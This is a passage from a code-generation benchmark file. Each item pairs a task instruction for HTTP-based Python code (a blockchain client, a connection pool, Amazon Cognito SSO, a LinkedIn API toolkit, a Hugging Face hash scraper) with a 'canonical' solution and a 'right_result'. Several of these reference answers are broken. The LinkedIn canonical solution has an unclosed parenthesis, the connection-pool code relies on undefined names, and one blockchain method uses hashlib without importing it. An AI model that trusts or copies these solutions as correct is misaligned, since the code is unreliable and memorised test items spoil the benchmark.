json={'nodes': list(nodes)}\n            )\n            return (True, response.json()) if response.status_code == 201 else (False, None)\n        except requests.exceptions.RequestException:\n            return (False, None)",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom typing import Set, Tuple, Optional, List, Dict\n\nclass BlockchainClient:\n    def __init__(self):\n        self.nodes: Set[str] = set()\n\n    def register_node(self, address: str) -> None:\n        try:\n            parsed_url = requests.utils.urlparse(address)\n            if parsed_url.netloc:\n                self.nodes.add(parsed_url.netloc)\n            elif parsed_url.path:\n                self.nodes.add(parsed_url.path)\n        except Exception:\n            raise ValueError(\"Invalid URL\")\n\n    def resolve_conflicts(self) -> Tuple[bool, Optional[List]]:\n        new_chain = None\n        max_length = len(requests.get(f'http://{next(iter(self.nodes))}/chain').json()['chain'])\n\n        for node in self.nodes:\n            response = requests.get(f'http://{node}/chain')\n\n            if response.status_code == 200:\n                length = response.json()['length']\n                chain = response.json()['chain']\n\n                if length > max_length and self._valid_chain(chain):\n                    max_length = length\n                    new_chain = chain\n\n        if new_chain:\n            return True, new_chain\n        return False, None\n\n    def get_chain(self, node: str) -> Tuple[bool, Optional[Dict]]:\n        try:\n            response = requests.get(f'http://{node}/chain')\n            if response.status_code == 200:\n                return True, response.json()\n            return False, None\n        except requests.exceptions.RequestException:\n            return False, None\n\n    def post_transaction(self, node: str, sender: str, recipient: str, amount: float) -> Tuple[bool, Optional[Dict]]:\n        try:\n            data = {\n                'sender': sender,\n                'recipient': recipient,\n                'amount': amount\n            }\n            response = requests.post(f'http://{node}/transactions/new', json=data)\n            if response.status_code == 201:\n                return True, response.json()\n            return False, None\n        except requests.exceptions.RequestException:\n            return False, None\n\n    def register_nodes(self, node: str, nodes: list) -> Tuple[bool, Optional[Dict]]:\n        try:\n            data = {'nodes': nodes}\n            response = requests.post(f'http://{node}/nodes/register', json=data)\n            if response.status_code == 201:\n                return True, response.json()\n            return False, None\n        except requests.exceptions.RequestException:\n            return False, None\n\n    def _valid_chain(self, chain: List) -> bool:\n        last_block = chain[0]\n        current_index = 1\n\n        while current_index < len(chain):\n            block = chain[current_index]\n\n            if block['previous_hash'] != self._hash(last_block):\n                return False\n\n            if not self._valid_proof(last_block['proof'], block['proof']):\n                return False\n\n            last_block = block\n            current_index += 1\n\n        return True\n\n    def _hash(self, block: Dict) -> str:\n        import hashlib\n        import json\n        block_string = json.dumps(block, sort_keys=True).encode()\n        return hashlib.sha256(block_string).hexdigest()\n\n    def _valid_proof(self, last_proof: int, proof: int) -> bool:\n        guess = f'{last_proof}{proof}'.encode()\n        guess_hash = hashlib.sha256(guess).hexdigest()\n        return guess_hash[:4] == \"0000\""
  },
  {
    "Task_id": 86,
    "Instruction": "Task Description: Create a Python function that interacts with a REST API to retrieve node version information for installation or to list all available versions of a node.\n\nFunction Description: The function should use the Python requests library to make HTTP GET requests to a specified API endpoint. It should handle both the case where a specific version is requested and where all versions are requested. The function should properly process successful responses and handle errors.\n\nInput:\n- For install_node function:\n  - node_id (str): The unique identifier of the node\n  - version (str, optional): Specific version of the node to retrieve (defaults to None for latest version)\n\n- For all_versions_of_node function:\n  - node_id (str): The unique identifier of the node\n\nOutput:\n- For install_node function:\n  - On success (HTTP 200): Returns parsed NodeVersion data (converted from JSON response)\n  - On failure: Returns None\n\n- For all_versions_of_node function:\n  - On success (HTTP 200): Returns the JSON response containing all versions\n  - On failure: Returns None",
    "Canonical_solution": "import requests\nbase_url = \"https://api.comfy.org\"\n\ndef install_node(node_id, version=None):\n    \"\"\"\n    Retrieves the node version for installation.\n\n    Args:\n      node_id (str): The unique identifier of the node.\n      version (str, optional): Specific version of the node to retrieve. If omitted, the latest version is returned.\n\n    Returns:\n      NodeVersion: Node version data or error message.\n    \"\"\"\n    if version is None:\n        url = f\"{base_url}/nodes/{node_id}/install\"\n    else:\n        url = f\"{base_url}/nodes/{node_id}/install?version={version}\"\n\n    response = requests.get(url)\n    if response.status_code == 200:\n        # Convert the API response to a NodeVersion object\n        return map_node_version(response.json())\n    else:\n        return None\n\ndef all_versions_of_node(node_id):\n    url = f\"https://api.comfy.org/nodes/{node_id}/versions\"\n\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\ndef install_node(node_id, version=None):\n    base_url = \"https://api.example.com/nodes\"\n    url = f\"{base_url}/{node_id}\"\n    if version:\n        url += f\"/versions/{version}\"\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            return response.json()\n        else:\n            return None\n    except requests.RequestException:\n        return None\n\ndef all_versions_of_node(node_id):\n    url = f\"https://api.example.com/nodes/{node_id}/versions\"\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            return response.json()\n        else:\n            return None\n    except requests.RequestException:\n        return None"
  },
  {
    "Task_id": 9,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, with support for retries and timeouts.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that maintains a pool of reusable connections to a specified host and port. It handles connection lifecycle, retries on failures, and timeout management.\n\nAttributes:\n- scheme: [str] - The URL scheme (default 'http')\n- ConnectionCls: [class] - The connection class to use (default HTTPConnection)\n- host: [str] - The target host for connections\n- port: [int] - The target port for connections\n- timeout: [Timeout] - Default timeout configuration\n- retries: [Retry] - Retry configuration for failed requests\n- pool: [LifoQueue] - Queue holding the connection pool\n- block: [bool] - Whether to block when pool is empty\n- proxy: [dict] - Proxy configuration\n- proxy_headers: [dict] - Headers for proxy requests\n- conn_kw: [dict] - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with given configuration\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the given connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, timeout=_Default, **response_kw) -> HTTPResponse - Main method to execute HTTP requests with retry and timeout handling\n- close() -> None - Closes all connections in the pool",
    "Canonical_solution": "from socket import error as SocketError, timeout as SocketTimeout\nimport socket\nfrom .connection import HTTPConnection, HTTPSConnection, VerifiedHTTPSConnection\nfrom .exceptions import (\n    MaxRetryError,\n    ProtocolError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n    HTTPException,\n    BaseSSLError,\n    NewConnectionError,\n    ProxyError\n)\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.queue import LifoQueue\nimport queue\nimport sys\nimport warnings\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n\n    def __init__(self, host, port=None, strict=False,\n                 timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False,\n                 headers=None, retries=None,\n                 _proxy=None, _proxy_headers=None,\n                 **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except queue.Empty:\n            raise EmptyPoolError(self, \"Pool is empty.\")\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            httplib_response = conn.getresponse()\n            return httplib_response\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)\n            raise\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None,\n                redirect=True, timeout=_Default, **response_kw):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=timeout_obj.connect_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (TimeoutError, HTTPException, SocketError, ProtocolError,\n                BaseSSLError, SSLError) as e:\n            if isinstance(e, (BaseSSLError, CertificateError)):\n                e = SSLError(e)\n            elif isinstance(e, (SocketError, NewConnectionError)) and self.proxy:\n                e = ProxyError('Cannot connect to proxy.', e)\n            elif isinstance(e, (SocketError, HTTPException)):\n                e = ProtocolError('Connection aborted.', e)\n\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method, url, body, headers,\n                retries=retries, redirect=redirect,\n                timeout=timeout, **response_kw\n            )\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                if conn:\n                    conn.close()\n            except queue.Empty:\n                break",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import logging\nimport socket\nfrom http.client import HTTPConnection, HTTPResponse\nfrom queue import LifoQueue, Empty, Full\nfrom urllib.parse import urlparse\nimport time\n\nlog = logging.getLogger(__name__)\n\nclass Timeout:\n    DEFAULT_TIMEOUT = 300  # seconds\n\n    def __init__(self, connect=None, read=None):\n        self.connect = connect\n        self.read = read\n\n    def clone(self):\n        return Timeout(connect=self.connect, read=self.read)\n\nclass Retry:\n    def __init__(self, total=3, connect=None, read=None, redirect=None, status=None, backoff_factor=0):\n        self.total = total\n        self.connect = connect if connect is not None else total\n        self.read = read if read is not None else total\n        self.redirect = redirect if redirect is not None else total\n        self.status = status if status is not None else total\n        self.backoff_factor = backoff_factor\n\n    def new(self, **kwargs):\n        for key in kwargs:\n            if key not in ['total', 'connect', 'read', 'redirect', 'status', 'backoff_factor']:\n                raise TypeError(f\"Unexpected keyword argument: {key}\")\n        return Retry(**kwargs)\n\n    def sleep(self):\n        time.sleep(self.backoff_factor)\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False,\n                 headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.host = host\n        self.port = port if port else 80\n        self.strict = strict\n        self.timeout = Timeout() if isinstance(timeout, (int, float)) else timeout\n        self.retries = retries if retries is not None else Retry()\n        self.pool = LifoQueue(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n        self.headers = headers or {}\n\n        for _ in range(maxsize):\n            try:\n                conn = self._new_conn()\n                self._put_conn(conn)\n            except Exception as e:\n                log.warning(f\"Failed to initialize connection pool: {e}\")\n\n    def _new_conn(self):\n        try:\n            conn = self.ConnectionCls(self.host, self.port, timeout=self.timeout.connect, **self.conn_kw)\n            return conn\n        except socket.error as e:\n            raise ConnectionError(f\"Could not create a new connection: {e}\")\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except Empty:\n            conn = self._new_conn()\n        return conn\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put_nowait(conn)\n        except Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            return conn.getresponse()\n        except socket.timeout:\n            raise TimeoutError(\"Request timed out\")\n        except socket.error as e:\n            raise ConnectionError(f\"Connection error: {e}\")\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, timeout=_Default, **response_kw):\n        retries = retries if retries is not None else self.retries\n        redirect_count = 0\n        while True:\n            conn = self._get_conn()\n            try:\n                response = self._make_request(conn, method, url, body=body, headers=headers, timeout=timeout,\n                                              **response_kw)\n                if redirect and response.status in (301, 302, 303, 307, 308):\n                    redirect_count += 1\n                    if redirect_count > retries.total:\n                        raise Exception(\"Too many redirects\")\n                    location = response.getheader('location')\n                    parsed_location = urlparse(location)\n                    if parsed_location.netloc != f\"{self.host}:{self.port}\":\n                        raise Exception(\"Redirect to different host not allowed\")\n                    url = location\n                    self._put_conn(conn)\n                    continue\n                return response\n            except (ConnectionError, TimeoutError) as e:\n                if retries.remaining > 0:\n                    retries = retries.retry_from_exception(e)\n                    self._put_conn(conn)\n                    retries.sleep()\n                    continue\n                else:\n                    raise\n            except Exception:\n                self._put_conn(conn)\n                raise\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get_nowait()\n            except Empty:\n                break\n            conn.close()"
  },
  {
    "Task_id": 90,
    "Instruction": "Task Description: Create a Python function that extends a FastAPI application with a new REST endpoint and tests it using the requests library.\n\nFunction Description: The function `test_extend_fastapi` demonstrates how to extend a FastAPI application (wrapped in a Jina Flow) with a new GET endpoint '/hello' that returns a simple JSON message. It then tests this endpoint by making an HTTP request and verifying the response.\n\nInput: None (The function takes no parameters as it's self-contained for demonstration purposes)\n\nOutput: None (The function performs assertions to verify the endpoint works correctly but doesn't return any value)",
    "Canonical_solution": "import requests\nfrom jina import Flow\n\ndef test_extend_fastapi():\n    def extend_rest_function(app):\n        @app.get('/hello', tags=['My Extended APIs'])\n        async def foo():\n            return {'msg': 'hello world'}\n\n        return app\n\n    jina.helper.extend_rest_interface = extend_rest_function\n    f = Flow(protocol='http')\n\n    with f:\n        response = requests.get(f'http://localhost:{f.port}/hello')\n        assert response.status_code == 200\n        assert response.json() == {'msg': 'hello world'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "```python\nimport pytest\nfrom fastapi import FastAPI\nfrom jina import Flow\nimport requests\n\ndef test_extend_fastapi():\n    app = FastAPI()\n\n    # Extend the FastAPI application with a new endpoint\n    @app.get(\"/hello\")\n    def read_hello():\n        return {\"message\": \"Hello from Jina!\"}\n\n    # Create a Flow with the extended FastAPI application\n    f = Flow().add(uses='jinahub+docker://FastAPIExecutor').uses(app=app)\n\n    with f:\n        # Get the gateway address\n        gateway_address = f.gateway_address\n\n        # Test the new endpoint\n        response = requests.get(f\"{gateway_address}/hello\")\n        assert response.status_code == 200\n        data = response.json()\n        assert data['message'] == \"Hello from Jina!\"\n```"
  },
  {
    "Task_id": 93,
    "Instruction": "Task Description: Implement a Python class for interacting with Amazon Cognito's OAuth2 endpoints to handle Single Sign-On (SSO) functionality, including token management and user information retrieval.\n\nClass Description: The AmazonSSO class provides methods to authenticate users via Amazon Cognito, refresh access tokens, and retrieve user information. It handles OAuth2 flows including authorization code and refresh token grants.\n\nAttributes:\n- access_token: str - The OAuth2 access token for API authorization\n- refresh_token: str - The refresh token used to obtain new access tokens\n- client_id: str - AWS Cognito application client ID\n- client_secret: str - AWS Cognito application client secret\n- user_pool_id: str - AWS Cognito user pool identifier\n- region: str - AWS region where the user pool is hosted\n- user_info: dict - Dictionary containing user profile information\n\nMethods:\n- __init__(access_token: str = None, refresh_token: str = None) -> None - Initializes the AmazonSSO instance with optional tokens\n- get_new_token() -> str - Obtains a new access token using the refresh token\n- get_user_info() -> dict - Retrieves user information using the current access token\n- amazon_sso(code: str, redirect_uri: str = None) -> tuple[AmazonSSO, None] | tuple[None, None] - Static method that exchanges an authorization code for tokens",
    "Canonical_solution": "import requests\nimport logging\nfrom fastapi import HTTPException\nfrom Globals import getenv\n\nclass AmazonSSO:\n    def __init__(\n        self,\n        access_token=None,\n        refresh_token=None,\n    ):\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.client_id = getenv(\"AWS_CLIENT_ID\")\n        self.client_secret = getenv(\"AWS_CLIENT_SECRET\")\n        self.user_pool_id = getenv(\"AWS_USER_POOL_ID\")\n        self.region = getenv(\"AWS_REGION\")\n        self.user_info = self.get_user_info()\n\n    def get_new_token(self):\n        response = requests.post(\n            f\"https://{self.user_pool_id}.auth.{self.region}.amazoncognito.com/oauth2/token\",\n            data={\n                \"client_id\": self.client_id,\n                \"client_secret\": self.client_secret,\n                \"refresh_token\": self.refresh_token,\n                \"grant_type\": \"refresh_token\",\n                \"scope\": \"openid email profile\",\n            },\n        )\n        return response.json()[\"access_token\"]\n\n    def get_user_info(self):\n        uri = f\"https://{self.user_pool_id}.auth.{self.region}.amazoncognito.com/oauth2/userInfo\"\n        response = requests.get(\n            uri,\n            headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n        )\n        if response.status_code == 401:\n            self.access_token = self.get_new_token()\n            response = requests.get(\n                uri,\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n        try:\n            data = response.json()\n            first_name = data.get(\"given_name\", \"\")\n            last_name = data.get(\"family_name\", \"\")\n            email = data[\"email\"]\n            return {\n                \"email\": email,\n                \"first_name\": first_name,\n                \"last_name\": last_name,\n            }\n        except:\n            raise HTTPException(\n                status_code=400,\n                detail=\"Error getting user info from AWS\",\n            )\n\n    @staticmethod\n    def amazon_sso(code, redirect_uri=None):\n        if not redirect_uri:\n            redirect_uri = getenv(\"MAGIC_LINK_URL\")\n        code = (\n            str(code)\n            .replace(\"%2F\", \"/\")\n            .replace(\"%3D\", \"=\")\n            .replace(\"%3F\", \"?\")\n            .replace(\"%3D\", \"=\")\n        )\n        response = requests.post(\n            f\"https://{getenv('AWS_USER_POOL_ID')}.auth.{getenv('AWS_REGION')}.amazoncognito.com/oauth2/token\",\n            data={\n                \"client_id\": getenv(\"AWS_CLIENT_ID\"),\n                \"client_secret\": getenv(\"AWS_CLIENT_SECRET\"),\n                \"code\": code,\n                \"grant_type\": \"authorization_code\",\n                \"redirect_uri\": redirect_uri,\n            },\n        )\n        if response.status_code != 200:\n            logging.error(f\"Error getting AWS access token: {response.text}\")\n            return None, None\n        data = response.json()\n        access_token = data[\"access_token\"]\n        refresh_token = data[\"refresh_token\"]\n        return AmazonSSO(access_token=access_token, refresh_token=refresh_token)",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom typing import Optional, Dict, Any, Tuple\n\nclass AmazonSSO:\n    def __init__(self, access_token: str = None, refresh_token: str = None) -> None:\n        self.access_token: str = access_token\n        self.refresh_token: str = refresh_token\n        self.client_id: str = ''\n        self.client_secret: str = ''\n        self.user_pool_id: str = ''\n        self.region: str = ''\n        self.user_info: Dict[str, Any] = {}\n\n    def get_new_token(self) -> str:\n        token_url = f'https://{self.user_pool_id}.auth.{self.region}.amazoncognito.com/oauth2/token'\n        data = {\n            'grant_type': 'refresh_token',\n            'client_id': self.client_id,\n            'refresh_token': self.refresh_token\n        }\n        auth = (self.client_id, self.client_secret)\n        response = requests.post(token_url, data=data, auth=auth)\n        if response.status_code == 200:\n            tokens = response.json()\n            self.access_token = tokens.get('access_token')\n            return self.access_token\n        else:\n            raise Exception(f'Failed to refresh token: {response.text}')\n\n    def get_user_info(self) -> Dict[str, Any]:\n        user_info_url = 'https://cognito-idp.amazonaws.com/oauth2/userInfo'\n        headers = {'Authorization': f'Bearer {self.access_token}'}\n        response = requests.get(user_info_url, headers=headers)\n        if response.status_code == 200:\n            self.user_info = response.json()\n            return self.user_info\n        else:\n            raise Exception(f'Failed to retrieve user info: {response.text}')\n\n    @staticmethod\n    def amazon_sso(code: str, redirect_uri: str = None) -> Tuple[Optional['AmazonSSO'], Optional[Dict[str, Any]]]:\n        # Assuming the instance is initialized with these values elsewhere or passed via environment\n        user_pool_id = ''\n        region = ''\n        client_id = ''\n        client_secret = ''\n\n        token_url = f'https://{user_pool_id}.auth.{region}.amazoncognito.com/oauth2/token'\n        data = {\n            'grant_type': 'authorization_code',\n            'client_id': client_id,\n            'code': code,\n            'redirect_uri': redirect_uri\n        }\n        auth = (client_id, client_secret)\n        response = requests.post(token_url, data=data, auth=auth)\n        if response.status_code == 200:\n            tokens = response.json()\n            sso_instance = AmazonSSO(\n                access_token=tokens.get('access_token'),\n                refresh_token=tokens.get('refresh_token')\n            )\n            sso_instance.client_id = client_id\n            sso_instance.client_secret = client_secret\n            sso_instance.user_pool_id = user_pool_id\n            sso_instance.region = region\n            user_info = sso_instance.get_user_info()\n            return sso_instance, user_info\n        else:\n            return None, None"
  },
  {
    "Task_id": 94,
    "Instruction": "Task Description: Create a function that sends an HTTP POST request to a specified URL with given headers and data, and returns the response status code and content.\n\nFunction Description: The function uses the Python `requests` library to send an HTTP POST request to the provided URL. It includes custom headers and sends the data in JSON format. The function then returns the HTTP status code and the response body as text.\n\nInput:  \n- `url` (str): The target URL to which the POST request will be sent.  \n- `headers` (dict): A dictionary containing HTTP headers to be included in the request.  \n- `data` (dict): A dictionary containing the data to be sent in the request body, which will be converted to JSON format.  \n\nOutput:  \n- Returns a tuple containing:  \n  - `status_code` (int): The HTTP status code of the response (e.g., 200, 404, 500).  \n  - `response_text` (str): The response body as plain text.",
    "Canonical_solution": "import requests\nimport json\n\ndef send_http_request(url, headers, data):\n    response = requests.post(url, headers=headers, data=json.dumps(data))\n    return response.status_code, response.text",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\ndef send_post_request(url, headers, data):\n    response = requests.post(url, headers=headers, json=data)\n    return response.status_code, response.text"
  },
  {
    "Task_id": 95,
    "Instruction": "Task Description: Implement a LinkedIn API toolkit class that provides functionality to interact with LinkedIn's API for creating posts, deleting posts, and retrieving user profile information.\n\nClass Description: The LinkedInToolkit class encapsulates LinkedIn API operations including post creation, post deletion, and profile retrieval. It handles authentication using an access token and manages API requests and responses.\n\nAttributes:\n_access_token: str - Stores the LinkedIn API access token retrieved from environment variables.\n\nMethods:\n__init__() -> None - Initializes the LinkedInToolkit instance by obtaining the access token.\ncreate_post(text: str) -> Dict - Creates a new LinkedIn post with the given text content.\ndelete_post(post_id: str) -> str - Deletes a LinkedIn post specified by its post ID.\nget_profile(include_id: bool = False) -> Dict - Retrieves the user's LinkedIn profile information.\n_get_access_token() -> str - Private method to retrieve the LinkedIn access token from environment variables.",
    "Canonical_solution": "import json\nimport os\nfrom http import HTTPStatus\nfrom typing import List, Dict\nimport requests\n\nclass LinkedInToolkit:\n    def __init__(self):\n        self._access_token = self._get_access_token()\n\n    def create_post(self, text: str) -> Dict:\n        url = 'https://api.linkedin.com/v2/ugcPosts'\n        urn = self.get_profile(include_id=True)\n\n        headers = {\n            'X-Restli-Protocol-Version': '2.0.0',\n            'Content-Type': 'application/json',\n            'Authorization': f'Bearer {self._access_token}',\n        }\n\n        post_data = {\n            \"author\": urn['id'],\n            \"lifecycleState\": \"PUBLISHED\",\n            \"specificContent\": {\n                \"com.linkedin.ugc.ShareContent\": {\n                    \"shareCommentary\": {\"text\": text},\n                    \"shareMediaCategory\": \"NONE\",\n                }\n            },\n            \"visibility\": {\n                \"com.linkedin.ugc.MemberNetworkVisibility\": \"PUBLIC\"\n            },\n        }\n\n        response = requests.post(\n            url, headers=headers, data=json.dumps(post_data)\n        if response.status_code == 201:\n            post_response = response.json()\n            post_id = post_response.get('id', None)\n            return {'Post ID': post_id, 'Text': text}\n        else:\n            raise Exception(\n                f\"Failed to create post. Status code: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n    def delete_post(self, post_id: str) -> str:\n        headers = {\n            \"Authorization\": f'Bearer {self._access_token}',\n            \"Content-Type\": \"application/json\",\n        }\n\n        response = requests.delete(\n            f\"https://api.linkedin.com/v2/ugcPosts/{post_id}\",\n            headers=headers,\n        )\n\n        if response.status_code != HTTPStatus.NO_CONTENT:\n            return (\n                f\"Request returned error: \"\n                f\"{response.status_code} {response.text}\"\n            )\n\n        return f\"Post deleted successfully. Post ID: {post_id}.\"\n\n    def get_profile(self, include_id: bool = False) -> Dict:\n        headers = {\n            \"Authorization\": f'Bearer {self._access_token}',\n            'Connection': 'Keep-Alive',\n            'Content-Type': 'application/json',\n            \"X-Restli-Protocol-Version\": \"2.0.0\",\n        }\n\n        response = requests.get(\n            \"https://api.linkedin.com/v2/userinfo\",\n            headers=headers,\n        )\n\n        if response.status_code != HTTPStatus.OK:\n            raise Exception(\n                f\"Failed to retrieve profile. \"\n                f\"Status code: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n        json_response = response.json()\n\n        locale = json_response.get('locale', {})\n        country = locale.get('country', 'N/A')\n        language = locale.get('language', 'N/A')\n\n        profile_report = {\n            \"Country\": country,\n            \"Language\": language,\n            \"First Name\": json_response.get('given_name'),\n            \"Last Name\": json_response.get('family_name'),\n            \"Email\": json_response.get('email'),\n        }\n\n        if include_id:\n            profile_report['id'] = f\"urn:li:person:{json_response['sub']}\"\n\n        return profile_report\n\n    def _get_access_token(self) -> str:\n        token = os.getenv(\"LINKEDIN_ACCESS_TOKEN\")\n        if not token:\n            return \"Access token not found. Please set LINKEDIN_ACCESS_TOKEN.\"\n        return token",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import os\nimport requests\nimport json\nfrom typing import Dict\n\nclass LinkedInToolkit:\n    def __init__(self):\n        self._access_token = self._get_access_token()\n\n    def _get_access_token(self) -> str:\n        token = os.getenv(\"LINKEDIN_ACCESS_TOKEN\")\n        if not token:\n            raise EnvironmentError(\"LINKEDIN_ACCESS_TOKEN environment variable not set.\")\n        return token\n\n    def create_post(self, text: str) -> Dict:\n        headers = {\n            \"Authorization\": f\"Bearer {self._access_token}\",\n            \"Content-Type\": \"application/json\",\n            \"X-Restli-Protocol-Version\": \"2.0.0\"\n        }\n\n        payload = {\n            \"author\": self.get_profile(include_id=True).get(\"id\"),\n            \"lifecycleState\": \"PUBLISHED\",\n            \"specificContent\": {\n                \"com.linkedin.ugc.ShareContent\": {\n                    \"shareCommentary\": {\n                        \"text\": text\n                    },\n                    \"shareMediaCategory\": \"NONE\"\n                }\n            },\n            \"visibility\": {\n                \"com.linkedin.ugc.MemberNetworkVisibility\": \"CONNECTIONS\"\n            }\n        }\n\n        response = requests.post(\n            \"https://api.linkedin.com/v2/ugcPosts\",\n            headers=headers,\n            data=json.dumps(payload)\n        )\n\n        if response.status_code == 201:\n            return {\"success\": True, \"post_id\": response.headers.get(\"x-restli-id\")}\n        else:\n            return {\"success\": False, \"error\": response.text}\n\n    def delete_post(self, post_id: str) -> str:\n        headers = {\n            \"Authorization\": f\"Bearer {self._access_token}\"\n        }\n\n        url = f\"https://api.linkedin.com/v2/ugcPosts/{post_id}\"\n\n        response = requests.delete(url, headers=headers)\n\n        if response.status_code == 204:\n            return \"Post deleted successfully.\"\n        else:\n            return f\"Failed to delete post. Error: {response.text}\"\n\n    def get_profile(self, include_id: bool = False) -> Dict:\n        headers = {\n            \"Authorization\": f\"Bearer {self._access_token}\"\n        }\n\n        url = \"https://api.linkedin.com/v2/me\"\n\n        response = requests.get(url, headers=headers)\n\n        if response.status_code == 200:\n            profile_data = response.json()\n            if not include_id and \"id\" in profile_data:\n                del profile_data[\"id\"]\n            return profile_data\n        else:\n            return {\"error\": response.text}"
  },
  {
    "Task_id": 96,
    "Instruction": "Task Description: Scrape SHA256 hashes from Hugging Face dataset pages and save them to a file.\n\nFunction Description: This function scrapes SHA256 hashes from a series of Hugging Face dataset pages by making HTTP GET requests to each page, parsing the HTML content to extract the hashes, and writing them to an output file along with their corresponding filenames. It also prints the collected hashes to the console.\n\nInput: None (The function uses hardcoded URLs and output filename)\n\nOutput: \n1. Writes to \"shard_hashes.txt\" file with format: \"[filename] [SHA256 hash]\"\n2. Prints collected SHA256 hashes to console with format: \"SHA256 hash [index]: [hash]\"\n3. Prints error messages for failed requests or missing hashes",
    "Canonical_solution": "import requests\nimport re\n\ndef scrape_huggingface_hashes():\n    base_url = 'https://huggingface.co/datasets/EleutherAI/pythia_deduped_pile_idxmaps/blob/main/pile_0.87_deduped_text_document-'\n    sha256_list = []\n\n    with open(\"shard_hashes.txt\", \"w\") as output_file:\n        for i in range(83):\n            page_number = f\"{i:05d}-of-00082.bin\"\n            url = base_url + page_number\n            file_name = url.split('/')[-1]\n\n            response = requests.get(url)\n\n            if response.status_code == 200:\n                html_content = response.text\n                matches = re.findall(r'<strong>SHA256:</strong>\\s*([\\da-fA-F]+)', html_content)\n\n                if matches:\n                    sha256_list.extend(matches)\n                    for sha256 in matches:\n                        output_file.write(f\"{file_name} {sha256}\\n\")\n                else:\n                    print(f\"No hash found for file: {file_name}\")\n            else:\n                print(f\"Failed to fetch HTML content from {url}. Status code: {response.status_code}\")\n\n    for idx, sha256 in enumerate(sha256_list, start=1):\n        print(f\"SHA256 hash {idx}: {sha256}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
